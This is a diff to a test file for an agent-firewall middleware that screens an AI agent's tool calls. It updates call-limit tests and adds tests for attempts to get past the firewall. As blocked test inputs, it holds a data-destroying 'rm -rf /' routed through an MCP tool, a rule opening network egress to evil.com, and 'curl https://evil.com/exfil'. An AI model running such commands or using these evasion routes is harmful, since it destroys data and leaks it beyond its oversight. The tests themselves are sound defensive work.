@@ -1,12 +1,12 @@
 import { describe, it, expect, beforeEach, afterEach, mock } from "bun:test";
 import { ToolMessage } from "@langchain/core/messages";
+import { Command, isCommand } from "@langchain/langgraph";
 import { createAgentFirewallMiddleware } from "../index";
 import { loadFirewallConfig, resetFirewallConfig } from "../config";
 import {
   resetThreadCallCounts,
   clearThreadCallCount,
 } from "../engine";
-import { FirewallViolationError } from "../types";
 
 /**
  * Build a fresh middleware against a given env, then reset env after the test.
@@ -163,7 +163,7 @@ describe("Agent Firewall middleware", () => {
   );
 
   it(
-    "aborts the turn with FirewallViolationError when the call ceiling is breached",
+    "aborts the turn with a goto:END Command when the call ceiling is breached (no throw)",
     withEnv({ FIREWALL_MAX_CALLS_PER_THREAD: "2" }, async () => {
       const mw = createAgentFirewallMiddleware();
       const handler = mock(async (req: any) => ({ ran: true, req }));
@@ -183,6 +183,9 @@ describe("Agent Firewall middleware", () => {
       expect(handler).toHaveBeenCalledTimes(2);
 
       // Third call trips the kill-switch (count was 2 after the two calls).
+      // Per the langchain wrapToolCall contract (ToolMessage | Command), the
+      // breach is surfaced as a Command that ends the turn rather than a throw
+      // across the async boundary.
       const request = {
         toolCall: {
           id: "call-3",
@@ -191,9 +194,11 @@ describe("Agent Firewall middleware", () => {
         },
         runtime: { configurable: { thread_id: "t1" } },
       };
-      await expect(
-        mw.wrapToolCall!(request as any, handler as any),
-      ).rejects.toBeInstanceOf(FirewallViolationError);
+      const result = await mw.wrapToolCall!(request as any, handler as any);
+      expect(isCommand(result)).toBe(true);
+      const cmd = result as Command;
+      // goto: END terminates the agent loop.
+      expect(cmd.goto).toEqual(["__end__"]);
 
       // The tool must NOT have executed on the blocked turn.
       expect(handler).toHaveBeenCalledTimes(2);
@@ -245,7 +250,8 @@ describe("Agent Firewall middleware", () => {
       };
       await mw.wrapToolCall!(request as any, handler as any);
     }
-    // 4th call should breach (3 calls already recorded).
+    // 4th call should breach (3 calls already recorded). The breach surfaces
+    // as a goto:END Command (contract-compliant), not a throw.
     const request = {
       toolCall: {
         id: "c4",
@@ -254,9 +260,10 @@ describe("Agent Firewall middleware", () => {
       },
       runtime: { configurable: { thread_id: "counter" } },
     };
-    await expect(
-      mw.wrapToolCall!(request as any, handler as any),
-    ).rejects.toBeInstanceOf(FirewallViolationError);
+    const result = await mw.wrapToolCall!(request as any, handler as any);
+    expect(isCommand(result)).toBe(true);
+    expect((result as Command).goto).toEqual(["__end__"]);
+    expect(handler).toHaveBeenCalledTimes(3);
     clearThreadCallCount("counter");
   });
 
@@ -265,4 +272,88 @@ describe("Agent Firewall middleware", () => {
     const b = loadFirewallConfig();
     expect(b).toBe(a);
   });
+
+  // --------------------------------------------------------------------------
+  // Integration coverage for review-blocker bypasses (middleware boundary).
+  // --------------------------------------------------------------------------
+
+  it(
+    "blocks a command routed through call_mcp_tool at the middleware boundary",
+    withEnv({ FIREWALL_COMMAND_DENY: "\\brm\\s+-rf\\b" }, async () => {
+      const mw = createAgentFirewallMiddleware();
+      const handler = mock(async (req: any) => ({ shouldNotReach: true }));
+      const request = {
+        toolCall: {
+          id: "mcp-1",
+          name: "call_mcp_tool",
+          args: {
+            server: "x",
+            name: "shell",
+            arguments: { command: "rm -rf /" },
+          },
+        },
+        runtime: { configurable: { thread_id: "t1" } },
+      };
+      const result = (await mw.wrapToolCall!(
+        request as any,
+        handler as any,
+      )) as ToolMessage;
+      expect(handler).not.toHaveBeenCalled();
+      expect(result).toBeInstanceOf(ToolMessage);
+      expect(String(result.content)).toContain("BLOCKED");
+    }),
+  );
+
+  it(
+    "blocks sandbox_network egress mutation to a non-allowlisted host",
+    withEnv({ FIREWALL_NETWORK_ALLOW: "github.com" }, async () => {
+      const mw = createAgentFirewallMiddleware();
+      const handler = mock(async (req: any) => ({ shouldNotReach: true }));
+      const request = {
+        toolCall: {
+          id: "net-1",
+          name: "sandbox_network",
+          args: { rules: [{ action: "allow", target: "evil.com" }] },
+        },
+        runtime: { configurable: { thread_id: "t1" } },
+      };
+      const result = (await mw.wrapToolCall!(
+        request as any,
+        handler as any,
+      )) as ToolMessage;
+      expect(handler).not.toHaveBeenCalled();
+      expect(result).toBeInstanceOf(ToolMessage);
+      expect(String(result.content)).toContain("evil.com");
+    }),
+  );
+
+  it(
+    "blocks a command-allowed fetcher egressing to a non-allowlisted host",
+    withEnv(
+      {
+        FIREWALL_COMMAND_ALLOW: "^curl\\b",
+        FIREWALL_NETWORK_ALLOW: "github.com",
+      },
+      async () => {
+        const mw = createAgentFirewallMiddleware();
+        const handler = mock(async (req: any) => ({ shouldNotReach: true }));
+        const request = {
+          toolCall: {
+            id: "compose-1",
+            name: "sandbox_shell",
+            args: { command: "curl https://evil.com/exfil" },
+          },
+          runtime: { configurable: { thread_id: "t1" } },
+        };
+        const result = (await mw.wrapToolCall!(
+          request as any,
+          handler as any,
+        )) as ToolMessage;
+        // curl is command-allowed, but evil.com is not network-allowed -> blocked.
+        expect(handler).not.toHaveBeenCalled();
+        expect(result).toBeInstanceOf(ToolMessage);
+        expect(String(result.content)).toContain("evil.com");
+      },
+    ),
+  );
 });
